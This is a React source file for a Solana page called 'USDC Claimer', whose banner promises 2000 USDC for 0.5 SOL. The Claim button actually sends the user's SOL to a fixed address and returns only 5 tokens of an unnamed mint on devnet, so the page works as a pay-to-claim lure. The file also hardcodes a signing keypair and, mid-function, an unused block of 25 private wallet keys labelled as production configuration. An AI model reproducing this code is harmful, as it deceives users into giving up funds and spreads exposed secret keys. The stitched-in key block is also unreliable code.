/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "NTJeNZE6aF4AgrttiqeDci4B51yD3UHfjfgkXknACQGyr72cVNwVvCrCvAj6eGAjVGes1DF331HeU74VWEEoTBo"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2NUsYiDwRPauXLTzKha1LAmP2Wu15a2kHoD9Jjw7F4hFMmXWDZPQwdgM5TkWm2ksSB3hLAvG9arN8JR7EmwvNNcx",
  "key1": "53WX6DkwgNXoVkNXWBCvDMTUYUdzRzkVArNvWVDdwUYqEZqAUuwUYB7ptGhe19qo19GQ66yKMcvB8BZ3K6NbPTWo",
  "key2": "615jXqCErqVuWmchoQgyBhXquMqgrajk9rXWAuFQdZpxcNPD7sRYMtaYgTN6PYcnLWqwxdcq5SmPygRkiFcW93Jy",
  "key3": "4CgLf22NcwCxiwRNMijV62sFD1qhkxY1Yox6AFe4JcSXk6QMdUmAPV11zL8AJXfukNbAm5Sejz1fFSvS6aV9Lq2u",
  "key4": "4WJUigwjcuroiZwFbttozUuZzbDiHUi6gSYUX3hPBwN82aw6Rp1CKQfARFctYsMAQApGQTJUyibLJerwY8xJe8VM",
  "key5": "9K6P2znkXTZUJFeLtmiWHgM7RQ3zg31AooQRMuRPCECjbFbMB4SC3E9EXtYabuvWacD8R16ZMqbqMnz5Z7bEvRS",
  "key6": "DRDRN7mh9Hf5Ct2wnszh1F77tF7RFa6kFq98M8PGVdtsJtRsRqNJr9GCCe477yo7QwJBcKL39NS1Csnk52WmUAb",
  "key7": "ddUKZDqE7QXrmyRfMUBSuiczCkKDbdi9k6hyKNT2LzNX4mcgfaBVQ7myeMD2pgmmP2mXCTEeG8cRuB4C5b7CcfN",
  "key8": "2p9avKRkemcsYo7RpCHiADQFFxEjBZWuCaKfyCWJxR3iKGZRcUpvHqH4GTUXNphEfkVGzEXcMHMtKAMgoehDbBu2",
  "key9": "4uxTn8e6cYmNbHopEtGNxZ6Yei2TMQDLDEQ9QCtcwsEXRvWpfLsL5Zp9PpFLJnBSHKyGJnDHX8cFpySY1kTH1Hcp",
  "key10": "F5xmeo2EHFVVGMbXPv4QV8ah2izswUaCc63bWN2J9nChWFhhCQhEUYWPSaVB5Y5LuV2Ety1Jx81vVG4YRzUUx7F",
  "key11": "5qYjw6xFReQAWHMyCEP95V8rxPTLNBsHweREKo4374nU5SeEx7cyVZ6RXHZSfXWLpVH6vu9uoGfRaL8JbGtfAuam",
  "key12": "4jMW3pBaKSQaqsjWeMcA6GfFgQdG8gW6grgYceZ5LczoAYqtSU5XSAN7FHYJaz6HS9cZoGv3HQQ35Khtzugb9Dfo",
  "key13": "31G5H1hRE63Q2AoiD6SkwuXkhX2xB3HG3UvpTtyds18UGFn7APiaEEZoXWkawPGiPYjqdp3DTkMSP2K3imw1N9Vn",
  "key14": "zcnzbeSNEmUosM6AVEfBiz3pQ9R4tSqgtffKYmh56gG6bHw7pdoX5R2WgihkmpKunPLvpQhQforrKAE5CWYEDRB",
  "key15": "4PGSNxncmPU3Xo3Fa1bTVrwkeUpKfhkz3uJS3zZULM9w1eNrx9zSaEnbVtexKzBoiGQyKG8GVscUkUxNMzKrA86r",
  "key16": "35GfAJEMS9HAKZDFpVg1GTzx1Nsnnmpj7bxn5z4SxikxPbQsMMER8UcubZBQV9gjP2JT8vdGM5E4SCkS6zKMhpmM",
  "key17": "2xPWdSkej32B2PeCTkDgtSkEKqGUktDVgiiyHsaHYEoBXvg4TC4oMgeWVVpsE4hwD1BdeDLXCMwiVeVgP9Vu8zNh",
  "key18": "5WJ7cdvvqi5sjfPgBHnxRnhTSCnSqFTXMHW8xNT1z8jfKM5ZBTnAqfXzvnH7pjk2MWGDZ9ra6mGSSKPg9chKXw1C",
  "key19": "2sSA8jL2nrHXPJHjNrU69i3jC2u5p2ZdZdj3vDLTNGnDxmhb8NaEGK4UETsuGBmpPerkTH7id8yhsMAr1QbVygY7",
  "key20": "4bKx1XxmZAuBYkpyH6iKC9wjZtqkjUaYEujq51pnRCsAQNsqgfX95CdKBzVhR7rqEVGa5uDwgkTQYv6G7vmBGJtP",
  "key21": "4JmJ7VXSwQvLwm7z3koyfZ5VYxqa9PC5AWWaQ8wjgMsZUZ2nwW9YJDabnXy6hZgDJB4eY55AAjQieme6ZkMEoN8V",
  "key22": "2wBCL2EqWMmyMK9FbBTL15bSPzPBF2Wp2dpCaugP2LoqQp5Nmvqo8yqxXcHCbyGUUuVx95dh5cQgGFbx9vzagi4Z",
  "key23": "4BuabNfNsYqfzTjefQESMzLSxnTYsTreQXkkamsDnwcGk3RwF4k2qbjyWoizGcxHrbVjqAqrJzKsZFJ36hjATWmh",
  "key24": "24o6P5HsPgaE5cjsr1BdTMqVYwgWnbByG72LUPPdyvEy2cCtc6DCi5sRqNeouggsk2k8gu7DUQ2RYp7Hc9yPJvix"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
